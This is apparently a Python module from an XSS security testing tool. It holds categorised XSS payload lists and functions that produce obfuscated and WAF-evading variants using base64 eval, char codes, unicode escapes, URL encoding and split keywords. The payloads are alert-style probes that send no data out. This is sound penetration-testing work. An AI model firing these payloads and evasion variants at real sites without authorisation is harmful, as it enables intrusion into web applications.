# xss_security_gui/payload_generator.py
"""
PayloadGenerator 6.0 — LLM-style генерация XSS payload-вариантов.

Особенности:
• "ML‑подобная" генерация (контекстные паттерны + эвристики)
• Расширенные библиотеки payload’ов по категориям
• Интеграция с PayloadManager 6.0 (SQLite backend)
• Интеграция с ThreatConnector 6.0
• Интеграция с MutatorTaskManager через payload_mutator.mutate_async
• URL‑encoding, Unicode, Base64, CharCode, HTML entities, polyglot, WAF‑bypass
"""

from __future__ import annotations

import base64
import logging
import random
import threading
import urllib.parse
from typing import List, Dict, Optional

from xss_security_gui.payloads import PAYLOADS, PAYLOAD_CATEGORIES
from xss_security_gui.threat_analysis.threat_connector import THREAT_CONNECTOR
from xss_security_gui.payload_mutator import mutate_async as MUTATE_ASYNC

log = logging.getLogger("PayloadGenerator6.0")


# ============================================================
#  БАЗОВЫЕ PAYLOAD’Ы (РАСШИРЕННАЯ БИБЛИОТЕКА)
# ============================================================

BASE_PAYLOADS: List[str] = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "\"><svg/onload=alert(1)>",
    "<iframe srcdoc=alert(1)>",
    "<body onload=alert(1)>",
    "javascript:alert(1)",
    "<svg><desc><![CDATA[alert(1)]]></desc></svg>",
    "<script>confirm(1)</script>",
    "<script>prompt(1)</script>",
    "<img src=1 onerror=confirm(1)>",
    "<details open ontoggle=alert(1)>",
    "<video src=x onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<marquee onstart=alert(1)>XSS</marquee>",
    "<svg/onload=alert`1`>",
    "<script src=data:text/javascript,alert(1)></script>",
]

CATEGORY_PATTERNS: Dict[str, List[str]] = {
    "Reflected": [
        "<script>alert(1)</script>",
        "\"><svg/onload=alert(1)>",
        "<img src=x onerror=alert(1)>",
    ],
    "Stored": [
        "<script>alert('stored-xss')</script>",
        "<img src=x onerror=alert('stored')>",
    ],
    "DOM": [
        "\"><img src=x onerror=alert(document.domain)>",
        "<script>alert(location.hash)</script>",
    ],
    "Polyglot": [
        "<svg><script>alert(1)</script>",
        "<!--><script>alert(1)</script>-->",
    ],
    "Bypass": [
        "<img src=x onerror=alert`1`>",
        "<svg/onload=alert`1`>",
        "<script>eval(atob('YWxlcnQoMSk='))</script>",
    ],
    "WAF": [
        "<script>self['al'+'ert'](1)</script>",
        "<img src=x onerror=window['al'+'ert'](1)>",
    ],
    "EventHandlers": [
        "<body onload=alert(1)>",
        "<div onclick=alert(1)>click</div>",
    ],
    "SVG": [
        "<svg/onload=alert(1)>",
        "<svg><desc><![CDATA[alert(1)]]></desc></svg>",
    ],
    "URL": [
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
    ],
    "Unicode": [
        "<script>alert('\u0031')</script>",
        "<img src=x onerror=alert('\u0031')>",
    ],
    "TemplateInjection": [
        "{{7*7}}",
        "{{constructor.constructor('alert(1)')()}}",
    ],
    "FrameworkSpecific": [
        "{{constructor.constructor('alert(1)')()}}",  # Angular/Handlebars
        "{{= alert(1) }}",                            # EJS
        "${{alert(1)}}",                              # Vue-like
    ],
}


# ============================================================
#  "ML‑ПОДОБНЫЙ" ГЕНЕРАТОР (ЭВРИСТИКИ + КОНТЕКСТ)
# ============================================================

def _ml_suggest_payloads(
    category: str,
    count: int = 20,
    context: Optional[Dict] = None,
) -> List[str]:
    """
    Эмуляция LLM‑генерации:
    • учитывает категорию
    • учитывает контекст (framework, waf, dom, csp и т.п.)
    • комбинирует паттерны + обфускацию
    """

    context = context or {}
    framework = (context.get("framework") or "generic").lower()
    waf = bool(context.get("waf"))
    dom = bool(context.get("dom"))
    csp = context.get("csp", "")

    base_pool = CATEGORY_PATTERNS.get(category, BASE_PAYLOADS) + BASE_PAYLOADS
    results: List[str] = []

    for _ in range(count):
        base = random.choice(base_pool)
        p = base

        # DOM‑ориентированные
        if dom and random.random() < 0.4:
            p = p.replace("alert(1)", "alert(document.domain)")

        # CSP‑aware (data:, srcdoc)
        if "script-src" in str(csp).lower() and random.random() < 0.4:
            p = "<script src=data:text/javascript,alert(1)></script>"

        # Framework‑specific
        if framework in ("angular", "vue", "react", "handlebars") and random.random() < 0.5:
            p = _framework_aware_payload(framework, base)

        # WAF‑bypass
        if waf and random.random() < 0.6:
            p = _waf_bypass_variant(p)

        # Дополнительная обфускация
        if random.random() < 0.5:
            p = _randomize_payload(p)

        results.append(p)

    return results


def _framework_aware_payload(framework: str, base: str) -> str:
    fw = framework.lower()
    if fw == "angular":
        return "{{constructor.constructor('alert(1)')()}}"
    if fw == "vue":
        return "<div v-on:click=\"alert(1)\">x</div>"
    if fw == "react":
        return "dangerouslySetInnerHTML={{__html: '<script>alert(1)</script>'}}"
    if fw == "handlebars":
        return "{{#with \"\"}}{{#with \"\"}}{{/with}}{{/with}}<script>alert(1)</script>"
    return base


def _waf_bypass_variant(payload: str) -> str:
    variants = [
        payload.replace("alert", "al" + "e" + "rt"),
        payload.replace("alert", "self['al'+'ert']"),
        payload.replace("alert", "window['al'+'ert']"),
        payload.replace("<script>", "<scr" + "ipt>"),
    ]
    return random.choice(variants)


# ============================================================
#  ПУБЛИЧНЫЙ API: ГЕНЕРАЦИЯ PAYLOAD’ОВ
# ============================================================

def generate_payloads(
    category: str = "Reflected",
    count: int = 20,
    smart: bool = True,
    context: Optional[Dict] = None,
) -> List[str]:
    """
    Генерирует список payload’ов для указанной категории.
    Если smart=True — использует "ML‑подобный" генератор.
    """

    if category not in PAYLOAD_CATEGORIES:
        category = "Reflected"

    if smart:
        return _ml_suggest_payloads(category, count=count, context=context)

    results: List[str] = []
    for _ in range(count):
        base = random.choice(BASE_PAYLOADS)
        results.append(_randomize_payload(base))
    return results


# ============================================================
#  ПУБЛИЧНЫЙ API: ГЕНЕРАЦИЯ ВАРИАЦИЙ ОДНОГО PAYLOAD’А
# ============================================================

def generate_variants(payload: str, context: Optional[Dict] = None) -> List[str]:
    """
    Создаёт расширенный набор вариаций payload’а.
    Учитывает контекст (waf, dom, framework) при необходимости.
    """

    context = context or {}
    waf = bool(context.get("waf"))

    variants = set()
    variants.add(payload)

    try:
        # Base64
        b64 = base64.b64encode(payload.encode()).decode()
        variants.add(f"eval(atob('{b64}'))")

        # Unicode escape
        uni = ''.join(f'\\u{ord(c):04x}' for c in payload)
        variants.add(f"<script>{uni}</script>")

        # CharCode
        charcodes = ','.join(str(ord(c)) for c in payload)
        variants.add(f"<script>eval(String.fromCharCode({charcodes}))</script>")

        # HTML entities
        html_encoded = (
            payload.replace('<', '&#x3C;')
                   .replace('>', '&#x3E;')
                   .replace('"', '&#x22;')
                   .replace("'", '&#x27;')
        )
        variants.add(html_encoded)

        # URL encoding
        url_encoded = ''.join('%{:02X}'.format(ord(c)) for c in payload)
        variants.add(url_encoded)

        # Double URL encoding
        variants.add(urllib.parse.quote(urllib.parse.quote(payload)))

        # Reverse trick
        reversed_payload = payload[::-1]
        variants.add(f"<script>eval('{reversed_payload}'[::-1])</script>")

        # Break tags
        variants.add(payload.replace("<", "<\n"))

        # Alert obfuscation
        variants.add(payload.replace("alert", "a" + "l" * random.randint(1, 5) + "ert"))

        # HTML comment injection
        variants.add(payload.replace(">", "><!--xss-->"))

        # WAF‑aware
        if waf:
            variants.add(_waf_bypass_variant(payload))

    except Exception as e:
        log.error(f"Ошибка генерации вариантов: {e}")

    return list(variants)


# ============================================================
#  ВНУТРЕННИЙ РАНДОМИЗАТОР
# ============================================================

def _randomize_payload(payload: str) -> str:
    """Создаёт случайную вариацию payload’а."""

    choice = random.randint(1, 6)

    if choice == 1:
        return urllib.parse.quote(payload)

    if choice == 2:
        return urllib.parse.quote(urllib.parse.quote(payload))

    if choice == 3:
        return payload.replace("<", "<\n")

    if choice == 4:
        return payload.replace("alert", "a" + "l" * random.randint(1, 5) + "ert")

    if choice == 5:
        return "".join(f"\\u{ord(c):04x}" for c in payload)

    if choice == 6:
        return payload.replace(">", "><!--xss-->")

    return payload


# ============================================================
#  ПОТОКОВЫЙ ГЕНЕРАТОР + ИНТЕГРАЦИЯ С MUTATOR
# ============================================================

class PayloadGeneratorThread(threading.Thread):
    """
    Генератор, который:
    • принимает payload
    • генерирует варианты
    • сохраняет их в PayloadManager
    • (опционально) отправляет их в MutatorTaskManager через mutate_async
    • отправляет событие в ThreatConnector
    """

    def __init__(
        self,
        category: str,
        payload: str,
        context: Optional[Dict] = None,
        integrate_mutator: bool = False,
        framework: str = "generic",
    ):
        super().__init__(daemon=True)
        self.category = category
        self.payload = payload
        self.context = context or {}
        self.integrate_mutator = integrate_mutator
        self.framework = framework

    def run(self):
        try:
            log.info(f"[PG6.0] Генерация вариантов для payload: {self.payload}")

            variants = generate_variants(self.payload, context=self.context)

            added = 0
            for v in variants:
                if PAYLOADS.add(self.category, v):
                    added += 1
                    if self.integrate_mutator:
                        # Интеграция с MutatorTaskManager (через mutate_async)
                        MUTATE_ASYNC(self.category, v, framework=self.framework)

            THREAT_CONNECTOR.emit(
                module="PayloadGenerator6.0",
                target=self.category,
                result={
                    "severity": "info",
                    "category": "payload_generation",
                    "source": "PayloadGenerator6.0",
                    "payload": self.payload,
                    "generated": added,
                    "variants_preview": variants[:5],
                    "integrated_with_mutator": self.integrate_mutator,
                    "framework": self.framework,
                },
            )

            log.info(f"[PG6.0] Генерация завершена: добавлено {added} вариантов")

        except Exception as e:
            log.error(f"[PG6.0] Ошибка в PayloadGeneratorThread: {e}")

            THREAT_CONNECTOR.emit(
                module="PayloadGenerator6.0",
                target=self.category,
                result={
                    "severity": "error",
                    "category": "payload_generation",
                    "source": "PayloadGenerator6.0",
                    "message": str(e),
                },
            )


# ============================================================
#  УПРОЩЁННЫЙ API ДЛЯ GUI / AUTOATTACK
# ============================================================

def generate_payload_async(
    category: str,
    payload: str,
    context: Optional[Dict] = None,
    integrate_mutator: bool = False,
    framework: str = "generic",
) -> PayloadGeneratorThread:
    """
    Запускает генерацию payload‑вариантов в фоне.
    Если integrate_mutator=True — каждый сгенерированный вариант
    отправляется в MutatorTaskManager через mutate_async.
    """
    t = PayloadGeneratorThread(
        category=category,
        payload=payload,
        context=context,
        integrate_mutator=integrate_mutator,
        framework=framework,
    )
    t.start()
    return t